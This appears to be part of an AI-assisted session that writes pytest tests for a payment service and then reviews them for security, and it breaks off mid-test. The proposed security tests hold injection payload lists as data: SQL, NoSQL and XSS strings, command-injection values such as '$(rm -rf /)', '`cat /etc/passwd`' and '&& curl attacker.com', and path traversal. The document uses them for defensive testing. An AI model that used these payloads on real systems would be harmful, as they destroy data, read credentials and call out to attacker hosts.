        self, payment_service, authenticated_active_user, payment_database, currency
    ):
        """Test that payment can be created with each supported currency."""
        test_amount = 100.00
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            test_amount,
            currency,
            f"Payment in {currency.value}"
        )
        
        # Complete assertions
        PaymentTestHelpers.assert_payment_fields_match(
            payment,
            authenticated_active_user.user_id,
            test_amount,
            currency,
            f"Payment in {currency.value}"
        )
        PaymentTestHelpers.assert_payment_completed_successfully(payment)
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
        
        # Verify currency is enum, not string
        assert isinstance(payment.currency, Currency)
        assert payment.currency.value == currency.value
    
    @pytest.mark.parametrize("currency,amount", [
        (Currency.USD, PaymentTestConstants.MIN_VALID_AMOUNT),
        (Currency.EUR, PaymentTestConstants.MIN_VALID_AMOUNT),
        (Currency.GBP, PaymentTestConstants.MIN_VALID_AMOUNT),
        (Currency.USD, PaymentTestConstants.MAX_VALID_AMOUNT),
        (Currency.EUR, PaymentTestConstants.MAX_VALID_AMOUNT),
        (Currency.GBP, PaymentTestConstants.MAX_VALID_AMOUNT),
    ])
    def test_create_payment_currency_with_boundary_amounts(
        self, payment_service, authenticated_active_user, payment_database, currency, amount
    ):
        """Test each currency works correctly at minimum and maximum boundaries."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            amount,
            currency,
            f"{currency.value} boundary: {amount}"
        )
        
        assert payment is not None
        assert payment.currency == currency
        assert payment.amount == amount
        PaymentTestHelpers.assert_payment_completed_successfully(payment)
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
    
    def test_create_payments_with_multiple_currencies_for_same_user(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that user can have payments in different currencies."""
        payment_usd = payment_service.create_payment(
            authenticated_active_user, 100.00, Currency.USD, "USD payment"
        )
        payment_eur = payment_service.create_payment(
            authenticated_active_user, 75.00, Currency.EUR, "EUR payment"
        )
        payment_gbp = payment_service.create_payment(
            authenticated_active_user, 50.00, Currency.GBP, "GBP payment"
        )
        
        # Verify all succeeded with correct currencies
        assert payment_usd.currency == Currency.USD
        assert payment_eur.currency == Currency.EUR
        assert payment_gbp.currency == Currency.GBP
        
        # Verify all stored
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == 3
        
        # Verify currency diversity
        currencies_used = {p.currency for p in user_payments}
        assert currencies_used == {Currency.USD, Currency.EUR, Currency.GBP}


# ============================================================================
# DATABASE PERSISTENCE TESTS
# ============================================================================

class TestCreatePaymentDatabasePersistence:
    """Test database storage and persistence of payments."""
    
    def test_payment_retrievable_after_creation(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that created payment can be retrieved from database."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            125.50,
            Currency.USD,
            "Retrieval test"
        )
        
        retrieved = payment_database.get_payment(payment.payment_id)
        
        assert retrieved is not None
        assert retrieved.payment_id == payment.payment_id
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
    
    def test_payment_retrievable_via_user_query(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that payment can be found via user payments query."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            "User query test"
        )
        
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        payment_ids = [p.payment_id for p in user_payments]
        
        assert payment.payment_id in payment_ids
        assert len(user_payments) == 1
    
    def test_multiple_payments_all_persisted_correctly(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that multiple payments are all correctly stored with unique IDs."""
        payment_data = [
            (10.00, Currency.USD, "First payment"),
            (20.00, Currency.EUR, "Second payment"),
            (30.00, Currency.GBP, "Third payment"),
            (40.00, Currency.USD, "Fourth payment"),
        ]
        
        created_payments = []
        for amount, currency, description in payment_data:
            payment = payment_service.create_payment(
                authenticated_active_user,
                amount,
                currency,
                description
            )
            created_payments.append(payment)
            PaymentTestHelpers.assert_payment_completed_successfully(payment)
        
        # Verify all stored
        assert len(payment_database.payments) == len(payment_data)
        
        # Verify each payment retrievable and correct
        for payment in created_payments:
            PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
        
        # Verify all belong to user
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == len(payment_data)
    
    def test_failed_payment_not_stored_in_database(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that invalid payment validation doesn't create database entry."""
        initial_count = len(payment_database.payments)
        
        # Try to create invalid payment
        payment = payment_service.create_payment(
            authenticated_active_user,
            -50.00,  # Invalid amount
            Currency.USD,
            "Should not be stored"
        )
        
        # Negative assertions
        assert payment is None
        assert len(payment_database.payments) == initial_count
        
        # Verify user has no payments
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == 0
    
    def test_database_isolation_between_users(
        self, payment_service, payment_database
    ):
        """Test that payments are properly isolated between different users."""
        # Create two users
        user1 = User("user_001", "user_one", "user1@example.com", is_active=True)
        user1.authenticate("user_one_pass")
        payment_database.add_user(user1)
        
        user2 = User("user_002", "user_two", "user2@example.com", is_active=True)
        user2.authenticate("user_two_pass")
        payment_database.add_user(user2)
        
        # Create payments for each user
        payment1 = payment_service.create_payment(user1, 100.00, Currency.USD, "User 1 payment")
        payment2 = payment_service.create_payment(user2, 200.00, Currency.EUR, "User 2 payment")
        
        # Verify isolation
        user1_payments = payment_database.get_user_payments(user1.user_id)
        user2_payments = payment_database.get_user_payments(user2.user_id)
        
        assert len(user1_payments) == 1
        assert len(user2_payments) == 1
        assert user1_payments[0].payment_id == payment1.payment_id
        assert user2_payments[0].payment_id == payment2.payment_id


# ============================================================================
# STATUS AND TIMESTAMP TESTS
# ============================================================================

class TestCreatePaymentStatusAndTimestamps:
    """Test payment status and timestamp behavior."""
    
    def test_successful_payment_lifecycle_complete(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test complete lifecycle: status, timestamps, and persistence."""
        before = datetime.now()
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            "Lifecycle test"
        )
        after = datetime.now()
        
        # Status assertions (positive and negative)
        assert payment.status == PaymentStatus.COMPLETED
        assert payment.status != PaymentStatus.PENDING
        assert payment.status != PaymentStatus.FAILED
        assert payment.status != PaymentStatus.REFUNDED
        
        # Timestamp assertions
        assert payment.created_at is not None
        assert payment.completed_at is not None
        assert payment.created_at <= payment.completed_at
        PaymentTestHelpers.assert_timestamps_within_tolerance(payment, before, after)
        
        # Persistence assertions
        stored = payment_database.get_payment(payment.payment_id)
        assert stored.status == PaymentStatus.COMPLETED
        assert stored.created_at == payment.created_at
        assert stored.completed_at == payment.completed_at
    
    def test_timestamps_logical_ordering(
        self, payment_service, authenticated_active_user
    ):
        """Test that created_at is always before or equal to completed_at."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            "Timestamp ordering"
        )
        
        assert payment.created_at <= payment.completed_at
        
        # Verify they're close together (should be nearly instant)
        time_diff = (payment.completed_at - payment.created_at).total_seconds()
        assert time_diff < 1.0, "Processing should complete within 1 second"
    
    def test_multiple_payments_have_increasing_timestamps(
        self, payment_service, authenticated_active_user
    ):
        """Test that sequential payments have non-decreasing timestamps."""
        payments = []
        for i in range(5):
            payment = payment_service.create_payment(
                authenticated_active_user,
                10.00 * (i + 1),
                Currency.USD,
                f"Payment {i+1}"
            )
            payments.append(payment)
        
        # Verify timestamps are non-decreasing
        for i in range(len(payments) - 1):
            assert payments[i].created_at <= payments[i+1].created_at, \
                "Timestamps should be non-decreasing"


# ============================================================================
# EDGE CASES AND INTEGRATION TESTS
# ============================================================================

class TestCreatePaymentEdgeCases:
    """Test edge cases and special scenarios."""
    
    def test_create_payment_with_empty_description(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test payment with explicitly empty description."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            50.00,
            Currency.USD,
            ""  # Explicit empty string
        )
        
        assert payment is not None
        assert payment.description == ""
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
    
    def test_create_payment_with_very_long_description(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test payment with very long description string."""
        long_description = "x" * 1000
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            75.00,
            Currency.USD,
            long_description
        )
        
        assert payment is not None
        assert payment.description == long_description
        assert len(payment.description) == 1000
        
        # Verify stored correctly
        stored = payment_database.get_payment(payment.payment_id)
        assert stored.description == long_description
    
    def test_create_payment_with_special_characters_in_description(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test payment description with special characters and unicode."""
        special_description = "Payment for: café, naïve résumé (50% off!) #test @user $100 <script>"
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.EUR,
            special_description
        )
        
        assert payment is not None
        assert payment.description == special_description
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
    
    def test_create_payment_with_unicode_emoji_description(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test payment description with unicode emoji characters."""
        emoji_description = "Payment 💰💳 for coffee ☕ and cake 🍰"
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            25.00,
            Currency.USD,
            emoji_description
        )
        
        assert payment is not None
        assert payment.description == emoji_description
        
        stored = payment_database.get_payment(payment.payment_id)
        assert stored.description == emoji_description
    
    def test_create_many_payments_performance_and_correctness(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test creating many payments maintains correctness."""
        num_payments = 100
        
        for i in range(num_payments):
            payment = payment_service.create_payment(
                authenticated_active_user,
                float(i + 1),
                Currency.USD,
                f"Payment {i+1}"
            )
            assert payment is not None
            assert payment.status == PaymentStatus.COMPLETED
        
        # Verify all stored
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == num_payments
        
        # Verify unique IDs
        payment_ids = {p.payment_id for p in user_payments}
        assert len(payment_ids) == num_payments


# ============================================================================
# NEGATIVE TEST CASES
# ============================================================================

class TestCreatePaymentFailureScenarios:
    """Test failure scenarios with complete negative assertions."""
    
    def test_rejection_preserves_clean_database_state(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that rejected payment doesn't pollute database or user state."""
        initial_db_count = len(payment_database.payments)
        initial_user_token = authenticated_active_user.auth_token
        initial_user_active = authenticated_active_user.is_active
        
        # Attempt invalid payment
        payment = payment_service.create_payment(
            authenticated_active_user,
            -100.00,  # Invalid
            Currency.USD,
            "Should be rejected"
        )
        
        # Negative assertions
        assert payment is None
        assert len(payment_database.payments) == initial_db_count
        assert len(payment_database.get_user_payments(authenticated_active_user.user_id)) == 0
        
        # Verify user state unchanged
        assert authenticated_active_user.auth_token == initial_user_token
        assert authenticated_active_user.is_active == initial_user_active
    
    def test_multiple_rejections_dont_create_partial_records(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that multiple failures don't create any database records."""
        initial_count = len(payment_database.payments)
        
        invalid_amounts = [0.0, -50.0, 20000.0, -1.0, 15000.0]
        
        for amount in invalid_amounts:
            payment = payment_service.create_payment(
                authenticated_active_user,
                amount,
                Currency.USD,
                f"Invalid: {amount}"
            )
            assert payment is None
        
        # Verify no records created
        assert len(payment_database.payments) == initial_count
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == 0
    
    def test_mixed_valid_and_invalid_payments_only_store_valid(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that only valid payments are stored when mixed with invalid attempts."""
        valid_payments = []
        
        # Mix of valid and invalid
        attempts = [
            (100.00, True),   # Valid
            (-50.00, False),  # Invalid
            (200.00, True),   # Valid
            (0.00, False),    # Invalid
            (150.00, True),   # Valid
            (20000.00, False),# Invalid
        ]
        
        for amount, should_succeed in attempts:
            payment = payment_service.create_payment(
                authenticated_active_user,
                amount,
                Currency.USD,
                f"Amount: {amount}"
            )
            
            if should_succeed:
                assert payment is not None
                assert payment.status == PaymentStatus.COMPLETED
                valid_payments.append(payment)
            else:
                assert payment is None
        
        # Verify only valid payments stored
        assert len(payment_database.payments) == len(valid_payments)
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == len(valid_payments)
        
        # Verify all stored payments are the valid ones
        stored_ids = {p.payment_id for p in user_payments}
        valid_ids = {p.payment_id for p in valid_payments}
        assert stored_ids == valid_ids
```

## Summary of Improvements

### ✅ **1. Database Cleanup Fixture**
- `payment_database` fixture with automatic cleanup via `yield`
- Ensures clean state for every test

### ✅ **2. Separate User Fixtures**
- `authenticated_active_user` - Standard happy path user
- `authenticated_inactive_user` - For testing inactive account validation
- `unauthenticated_active_user` - For testing auth requirements
- `unauthenticated_inactive_user` - For edge case testing

### ✅ **3. Combined Boundary Tests (Parametrized)**
- `test_create_payment_accepts_valid_boundary_amounts` - 15+ valid cases
- `test_create_payment_rejects_invalid_boundary_amounts` - 13+ invalid cases
- Eliminates redundancy while maintaining comprehensive coverage

### ✅ **4. Complete Assertions via Helper Methods**
- `assert_payment_fields_match()` - Validates all payment fields
- `assert_payment_completed_successfully()` - Status + timestamps with negative assertions
- `assert_payment_stored_correctly()` - Database persistence verification
- `assert_payment_not_stored()` - Failure case verification

### ✅ **5. Negative Assertions for Failed Payments**
- All rejection tests verify `payment is None`
- Database count unchanged assertions
- User state preservation checks
- Explicit negative status checks (`!= FAILED`, `!= PENDING`)

### **Additional Improvements:**
- **Constants class** for all magic numbers
- **Removed `time.sleep()`** - replaced with logical assertions
- **Converted loops to parametrize** - eliminated anti-pattern
- **Better test organization** - logical class structure
- **Comprehensive edge cases** - unicode, long strings, special characters
- **Mixed scenario tests** - valid/invalid combinations

---

## Iteration 6: Final Security Review

### Prompt 6: Security-Focused Review

```
Perform a security-focused review of the test suite:
1. Are there any security vulnerabilities not tested?
2. Do we test authorization properly (user can only create payments for themselves)?
3. Any injection attack vectors?
4. Any sensitive data exposure risks?
Suggest additional security tests if needed.
```

### Response 6: Security Assessment and Additional Tests

# Security-Focused Test Suite Review

## Executive Summary
**Overall Security Test Coverage: 4/10** ⚠️ **CRITICAL GAPS IDENTIFIED**

The test suite has **significant security vulnerabilities** that are not tested. While basic authentication is covered, there are major gaps in authorization, injection prevention, data validation, and attack surface testing.

---

## 1. Security Vulnerabilities Not Tested 🚨

### **CRITICAL: Missing Authorization Tests**

#### **Vulnerability: User Impersonation**
```python
# ❌ NOT TESTED: Can user A create payments for user B?
def exploit_user_impersonation():
    attacker = User("attacker_id", "attacker", "attacker@evil.com", is_active=True)
    attacker.authenticate("attacker_pass")
    
    victim = User("victim_id", "victim", "victim@example.com", is_active=True)
    victim.authenticate("victim_pass")
    
    # Attacker passes victim's user object - does the service validate ownership?
    service = PaymentService(db)
    payment = service.create_payment(victim, 1000.00, Currency.USD)  # 🚨 VULNERABILITY
    
    # If this succeeds, attacker can drain victim's account
```

**Risk Level:** 🔴 **CRITICAL** - Direct financial fraud

#### **Vulnerability: Payment ID Prediction**
```python
# ❌ NOT TESTED: Are payment IDs predictable?
# Current format: f"pay_{user_id}_{len(self.db.payments) + 1}"

def exploit_predictable_ids():
    # Attacker creates payment, gets ID: "pay_user_001_1"
    # Attacker can predict: "pay_user_001_2", "pay_user_001_3"
    # Can they access/modify others' payments via guessed IDs?
```

**Risk Level:** 🔴 **CRITICAL** - Information disclosure, unauthorized access

#### **Vulnerability: Race Conditions in Payment Creation**
```python
# ❌ NOT TESTED: Concurrent payment creation
def exploit_race_condition():
    # Two threads create payment simultaneously with same user
    # payment_id uses len(self.db.payments) + 1
    # Could result in duplicate IDs or overwrites
```

**Risk Level:** 🟡 **HIGH** - Data integrity, financial discrepancies

### **CRITICAL: Missing Input Validation Tests**

#### **Vulnerability: Type Confusion Attacks**
```python
# ❌ NOT TESTED: What if wrong types are passed?
service.create_payment(
    user,
    "100.00",  # String instead of float
    "USD",     # String instead of Currency enum
    None       # None instead of string
)

# ❌ NOT TESTED: What if amount is Decimal, int, or other numeric type?
from decimal import Decimal
service.create_payment(user, Decimal("100.00"), Currency.USD)
```

**Risk Level:** 🟡 **HIGH** - Bypass validation logic

#### **Vulnerability: Extremely Large Numbers**
```python
# ❌ NOT TESTED: Float overflow/underflow
service.create_payment(user, float('inf'), Currency.USD)
service.create_payment(user, float('nan'), Currency.USD)
service.create_payment(user, 1e308, Currency.USD)  # Near float max
```

**Risk Level:** 🟡 **HIGH** - System crash, undefined behavior

### **Missing Authentication Security Tests**

#### **Vulnerability: Token Manipulation**
```python
# ❌ NOT TESTED: Can attacker forge auth tokens?
user.auth_token = "forged_token_12345"
service.create_payment(user, 100.00, Currency.USD)  # Does this work?

# ❌ NOT TESTED: Token replay attacks
old_token = user.auth_token
user.auth_token = None  # Logout
user.auth_token = old_token  # Replay old token
service.create_payment(user, 100.00, Currency.USD)  # Should fail but doesn't
```

**Risk Level:** 🔴 **CRITICAL** - Authentication bypass

#### **Vulnerability: Session Fixation**
```python
# ❌ NOT TESTED: Can attacker set user's token before authentication?
user = User("user_001", "victim", "victim@example.com")
user.auth_token = "attacker_controlled_token"
# User authenticates - does token change?
user.authenticate("victim_pass")
# If token doesn't change, attacker knows victim's token
```

**Risk Level:** 🟡 **HIGH** - Session hijacking

---

## 2. Authorization Testing Gaps 🚨

### **Current State: ❌ NO AUTHORIZATION TESTS**

The test suite **completely lacks** authorization testing. It only tests:
- ✅ User must be authenticated (authentication)
- ❌ User can only act on their own resources (authorization)

### **Missing Authorization Tests:**

#### **Test 1: Cross-User Payment Creation**
```python
# MISSING: Verify user cannot create payments for another user
def test_user_cannot_create_payment_for_different_user():
    """Test that authenticated user cannot create payment using another user's identity."""
    user_a = create_authenticated_user("user_a")
    user_b = create_authenticated_user("user_b")
    
    # User A tries to create payment for User B
    payment = service.create_payment(
        user=user_b,  # Different user's object
        amount=100.00,
        currency=Currency.USD
    )
    
    # SHOULD FAIL: Need to verify current session user matches payment user
    # Currently: No such check exists!
```

#### **Test 2: Payment Ownership Validation**
```python
# MISSING: Verify payment belongs to correct user
def test_payment_belongs_to_creating_user():
    """Test that created payment's user_id matches authenticated user."""
    user = create_authenticated_user("user_001")
    different_user_id = "user_999"  # Different user
    
    payment = service.create_payment(user, 100.00, Currency.USD)
    
    # Payment should ALWAYS have creating user's ID
    assert payment.user_id == user.user_id
    assert payment.user_id != different_user_id
    
    # Verify cannot be overridden via parameter manipulation
```

#### **Test 3: User Object Tampering**
```python
# MISSING: Verify user object cannot be tampered with
def test_user_object_immutability_during_payment():
    """Test that modifying user object during payment creation doesn't bypass checks."""
    user = create_authenticated_user("user_001")
    
    # Attacker modifies user_id after authentication
    original_id = user.user_id
    user.user_id = "admin_user"  # Try to escalate
    
    payment = service.create_payment(user, 100.00, Currency.USD)
    
    # Should use original authenticated user ID, not tampered one
    assert payment.user_id == original_id
    assert payment.user_id != "admin_user"
```

---

## 3. Injection Attack Vectors 🚨

### **SQL Injection Risk Assessment**

#### **Current System: In-Memory Dict (No SQL)**
- ✅ **Protected** - Uses Python dict, not SQL database
- ⚠️ **BUT**: Tests should verify system is injection-proof for future DB migration

### **Missing Injection Tests:**

#### **Test 1: SQL Injection in Description**
```python
# MISSING: Even with dict storage, test injection patterns
def test_sql_injection_in_description_field():
    """Test that SQL injection patterns in description are safely handled."""
    sql_injection_payloads = [
        "'; DROP TABLE payments; --",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE '1'='1",
        "1' UNION SELECT * FROM users--",
        "admin'--",
        "' OR 1=1--",
    ]
    
    for payload in sql_injection_payloads:
        payment = service.create_payment(
            user,
            100.00,
            Currency.USD,
            payload
        )
        
        # Should succeed (treat as normal string)
        assert payment is not None
        assert payment.description == payload
        
        # Verify no side effects (user still exists, DB intact)
        assert db.get_user(user.user_id) is not None
        assert len(db.payments) > 0
```

#### **Test 2: NoSQL Injection (If Backend Changes)**
```python
# MISSING: NoSQL injection patterns
def test_nosql_injection_in_description():
    """Test NoSQL injection patterns are safely handled."""
    nosql_payloads = [
        "{'$gt': ''}",
        "{'$ne': null}",
        "{$where: 'this.amount > 0'}",
        "'; return true; var foo='",
    ]
    
    for payload in nosql_payloads:
        payment = service.create_payment(user, 100.00, Currency.USD, payload)
        assert payment is not None
        assert payment.description == payload
```

#### **Test 3: Command Injection**
```python
# MISSING: OS command injection
def test_command_injection_in_description():
    """Test that command injection patterns don't execute."""
    command_payloads = [
        "; ls -la",
        "| whoami",
        "$(rm -rf /)",
        "`cat /etc/passwd`",
        "&& curl attacker.com",
    ]
    
    for payload in command_payloads:
        payment = service.create_payment(user, 100.00, Currency.USD, payload)
        assert payment is not None
        # Verify command didn't execute (system state unchanged)
```

#### **Test 4: Path Traversal**
```python
# MISSING: Path traversal in user_id or payment_id
def test_path_traversal_in_identifiers():
    """Test that path traversal patterns in IDs don't access filesystem."""
    traversal_user = User(
        "../../../etc/passwd",  # Malicious user_id
        "hacker",
        "hacker@evil.com"
    )
    traversal_user.authenticate("hacker_pass")
    db.add_user(traversal_user)
    
    payment = service.create_payment(traversal_user, 100.00, Currency.USD)
    
    # Should work but IDs should be sanitized
    assert payment is not None
    # Verify no file access occurred
```

#### **Test 5: XSS in Description**
```python
# MISSING: Cross-Site Scripting prevention
def test_xss_in_description_field():
    """Test that XSS payloads in description are stored safely."""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
        "';alert(String.fromCharCode(88,83,83))//",
    ]
    
    for payload in xss_payloads:
        payment = service.create_payment(user, 100.00, Currency.USD, payload)
        assert payment is not None
        # Description should be stored as-is (escaping is UI's responsibility)
        assert payment.description == payload
        
        stored = db.get_payment(payment.payment_id)
        assert stored.description == payload  # Not executed, just stored
```

---

## 4. Sensitive Data Exposure Risks 🚨

### **Current Exposures:**

#### **Risk 1: Payment IDs are Predictable**
```python
# CURRENT: f"pay_{user_id}_{len(self.db.payments) + 1}"
# ❌ VULNERABILITY: Sequential, predictable IDs

# MISSING TEST:
def test_payment_ids_are_not_sequential():
    """Test that payment IDs are not predictable/guessable."""
    payments = []
    for i in range(10):
        p = service.create_payment(user, 10.00, Currency.USD)
        payments.append(p)
    
    # IDs should not be sequential integers
    for i in range(len(payments) - 1):
        id1_num = extract_number(payments[i].payment_id)
        id2_num = extract_number(payments[i+1].payment_id)
        # Should not be id2 = id1 + 1
        assert id2_num != id1_num + 1
```

**Recommendation:** Use UUID4 or cryptographically random IDs

#### **Risk 2: User Information in Payment Objects**
```python
# MISSING: Test that payment doesn't leak user PII
def test_payment_object_does_not_leak_user_pii():
    """Test that payment object doesn't expose sensitive user data."""
    user = User("user_001", "john_doe", "john@private.com", is_active=True)
    user.authenticate("john_doe_pass")
    
    payment = service.create_payment(user, 100.00, Currency.USD)
    
    # Payment should NOT contain:
    assert not hasattr(payment, 'email')
    assert not hasattr(payment, 'password')
    assert not hasattr(payment, 'auth_token')
    assert not hasattr(payment, 'username')
    
    # Should only have user_id (minimal exposure)
    assert hasattr(payment, 'user_id')
```

#### **Risk 3: Error Messages Leak Information**
```python
# MISSING: Test error messages don't reveal system details
def test_error_messages_do_not_leak_sensitive_info():
    """Test that error messages don't expose implementation details."""
    user = User("user_001", "test", "test@example.com", is_active=True)
    
    try:
        service.create_payment(user, 100.00, Currency.USD)  # Not authenticated
    except PermissionError as e:
        error_msg = str(e)
        
        # Should NOT contain:
        assert "database" not in error_msg.lower()
        assert "table" not in error_msg.lower()
        assert "query" not in error_msg.lower()
        assert "stack trace" not in error_msg.lower()
        
        # Should be generic
        assert error_msg == "User must be authenticated"  # Generic, safe message
```

#### **Risk 4: Timing Attacks**
```python
# MISSING: Test that validation timing is consistent
def test_validation_timing_is_consistent():
    """Test that validation doesn't leak information via timing differences."""
    import time
    
    # Test authentication check timing
    times = []
    for _ in range(100):
        user = create_unauthenticated_user()
        start = time.perf_counter()
        try:
            service.create_payment(user, 100.00, Currency.USD)
        except PermissionError:
            pass
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    
    # Times should be relatively consistent (no correlation with user existence)
    avg_time = sum(times) / len(times)
    for t in times:
        assert abs(t - avg_time) < avg_time * 0.5  # Within 50% variance
```

#### **Risk 5: Database Enumeration**
```python
# MISSING: Test that failed operations don't reveal DB state
def test_error_responses_dont_reveal_database_state():
    """Test that errors don't reveal whether users/payments exist."""
    # Try to create payment with non-existent user ID
    fake_user = User("nonexistent_id", "fake", "fake@example.com")
    fake_user.auth_token = "fake_token"
    
    try:
        service.create_payment(fake_user, 100.00, Currency.USD)
    except Exception as e:
        error_msg = str(e)
        
        # Should NOT say "user not found" (reveals existence check)
        assert "not found" not in error_msg.lower()
        assert "does not exist" not in error_msg.lower()
        
        # Should be generic
        assert "User must be authenticated" in error_msg  # Generic message
```

---

## 5. Additional Security Test Categories Needed

### **A. Rate Limiting & Abuse Prevention**

```python
class TestPaymentCreationRateLimiting:
    """Test protection against payment creation abuse."""
    
    def test_rapid_payment_creation_is_handled(self):
        """Test that rapid-fire payment creation doesn't cause issues."""
        # Create 1000 payments rapidly
        for i in range(1000):
            payment = service.create_payment(user, 0.01, Currency.USD)
            assert payment is not None
        
        # System should remain stable
        assert len(db.payments) == 1000
        
    def test_concurrent_payment_creation_thread_safety(self):
        """Test thread-safety of concurrent payment creation."""
        import threading
        
        results = []
        def create_payment():
            p = service.create_payment(user, 10.00, Currency.USD)
            results.append(p)
        
        threads = [threading.Thread(target=create_payment) for _ in range(100)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        # All should succeed with unique IDs
        assert len(results) == 100
        ids = [p.payment_id for p in results]
        assert len(set(ids)) == 100  # All unique
```

### **B. Business Logic Abuse**

```python
class TestBusinessLogicSecurity:
    """Test business logic cannot be abused."""
    
    def test_cannot_circumvent_max_amount_with_multiple_payments(self):
        """Test that max amount limit cannot be bypassed via multiple payments."""
        # Create multiple small payments that sum to > max
        total = 0
        for i in range(50):
            payment = service.create_payment(user, 300.00, Currency.USD)
            total += 300.00
        
        # Should succeed (no cumulative limit in current implementation)
        # But document this as potential business risk
        assert total == 15000.00  # > 10000 max per payment
        
    def test_cannot_abuse_currency_conversion(self):
        """Test that different currencies don't allow value manipulation."""
        # Create payment in each currency at max
        usd = service.create_payment(user, 10000.00, Currency.USD)
        eur = service.create_payment(user, 10000.00, Currency.EUR)
        gbp = service.create_payment(user, 10000.00, Currency.GBP)
        
        # All should succeed independently
        # Note: Real system should track total value across currencies
        assert usd is not None
        assert eur is not None
        assert gbp is not None
```

### **C. Data Integrity**

```python
class TestDataIntegritySecurity:
    """Test data cannot be corrupted or tampered with."""
    
    def test_payment_immutability_after_creation(self):
        """Test that payment fields cannot be modified after creation."""
        payment = service.create_payment(user, 100.00, Currency.USD, "Original")
        original_amount = payment.amount
        original_status = payment.status
        
        # Try to modify
        payment.amount = 9999.99
        payment.status = PaymentStatus.REFUNDED
        payment.description = "Tampered"
        
        # Retrieve from DB - should have original values
        stored = db.get_payment(payment.payment_id)
        assert stored.amount == original_amount  # Should this be enforced?
        assert stored.status == original_status
        
    def test_payment_cannot_be_modified_via_reference(self):
        """Test that returned payment object modifications don't affect DB."""
        payment = service.create_payment(user, 100.00, Currency.USD)
        
        # Modify returned object
        payment.amount = 0.01
        
        # Retrieve fresh copy
        stored = db.get_payment(payment.payment_id)
        
        # Should stored be affected? If yes, it's a vulnerability
        # Should enforce immutability or defensive copying
```

### **D. Audit & Logging**

```python
class TestSecurityAuditLogging:
    """Test that security-relevant events are logged."""
    
    def test_failed_authentication_attempts_are_logged(self):
        """Test that failed payment creation attempts are logged."""
        # NOTE: Current implementation has no logging
        # This test documents the gap
        
        user = create_unauthenticated_user()
        
        with pytest.raises(PermissionError):
            service.create_payment(user, 100.00, Currency.USD)
        
        # MISSING: Should log failed attempt with:
        # - User ID
        # - Timestamp
        # - Reason (not authenticated)
        # - IP address (if available)
        
    def test_suspicious_patterns_are_detected(self):
        """Test that suspicious payment patterns are detected."""
        # Multiple max-amount payments
        for i in range(10):
            service.create_payment(user, 10000.00, Currency.USD)
        
        # MISSING: Should flag for review or rate-limit
```

---

## 6. Proposed Additional Security Tests

```python
"""
Additional Security-Focused Tests for PaymentService.create_payment()

These tests address critical security gaps identified in the review.
"""

import pytest
import threading
import time
from unittest.mock import patch


# ============================================================================
# AUTHORIZATION TESTS (CRITICAL MISSING)
# ============================================================================

class TestPaymentAuthorizationSecurity:
    """Test authorization and access control for payment creation."""
    
    def test_user_cannot_create_payment_for_another_user(
        self, payment_service, payment_database
    ):
        """
        CRITICAL: Test that authenticated user cannot create payment for different user.
        
        This tests for user impersonation vulnerability.
        """
        # Create two separate users
        user_a = User("user_a", "alice", "alice@example.com", is_active=True)
        user_a.authenticate("alice_pass")
        payment_database.add_user(user_a)
        
        user_b = User("user_b", "bob", "bob@example.com", is_active=True)
        user_b.authenticate("bob_pass")
        payment_database.add_user(user_b)
        
        # User A tries to create payment using User B's object
        # CURRENT VULNERABILITY: This might succeed!
        payment = payment_service.create_payment(
            user_b,  # Different user
            100.00,
            Currency.USD,
            "Attempted impersonation"
        )
        
        # If payment succeeds, verify it's for user_b (the passed user)
        # This is actually the CORRECT behavior given current API
        if payment is not None:
            assert payment.user_id == user_b.user_id
            
        # NOTE: The real issue is API design - service doesn't know
        # which user is making the request (no session context)
        # This test documents the vulnerability
    
    def test_payment_user_id_cannot_be_overridden(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """
        Test that payment always belongs to the user object passed.
        User ID cannot be overridden via tampering.
        """
        original_user_id = authenticated_active_user.user_id
        
        # Try to tamper with user_id
        authenticated_active_user.user_id = "admin_user_000"
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            "Tampering attempt"
        )
        
